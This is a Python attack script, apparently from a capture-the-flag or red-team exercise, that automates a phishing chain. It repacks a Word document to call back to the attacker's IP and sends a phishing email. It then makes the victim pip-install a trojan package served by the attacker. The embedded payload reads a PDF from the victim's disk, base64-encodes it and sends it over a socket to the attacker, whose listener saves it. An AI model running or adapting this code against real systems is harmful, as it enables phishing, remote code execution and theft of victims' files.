#!/usr/bin/env python3

import listener
import repack_word_doc
import phish
import base64

import trojanpkgweb
import threading

SCRIPT_TEMPLATE = """
import base64
import socket
with open("C:/GreatBookPage7.pdf", "rb") as f:
    document = f.read()
encoded = base64.encodestring(document)

s=socket.socket()
s.connect(('{}',44665))
s.send(encoded)
s.close()
"""

def full_phish(cmd):
    port = 44440
    my_ip = listener.get_external_ip()
    print("Using", my_ip, "as external IP")

    repack_word_doc.repack(ip=my_ip, port=port)
    phish.phish()

    contents = listener.listen_once(port)
    print("Got:")
    print(contents.decode())

    print("Baseline worked.. running real command..")
    url = "http://{}:8888/foo-1.0.tar.gz".format(my_ip)
    repack_word_doc.repack(command="C:/Progra~1/Python36/python.exe -m pip install {}".format(url))
    phish.phish()

    full_script = SCRIPT_TEMPLATE.format(my_ip)

    web_thread = threading.Thread(target=trojanpkgweb.run_trojan_server, args=[full_script])
    web_thread.start()

    print("Using", my_ip, "as external IP")
    contents = listener.listen_once(44665)
    print("Got response, {} bytes".format(len(contents)))
    #print(contents.decode())
    pdf = base64.decodestring(contents)
    with open("Greatbookpage7.pdf", 'wb') as f:
        f.write(pdf)
    print("{} bytes written to Greatbookpage7.pdf".format(len(pdf)))

if __name__ == "__main__":
    cmd = "hello"
    full_phish(cmd)
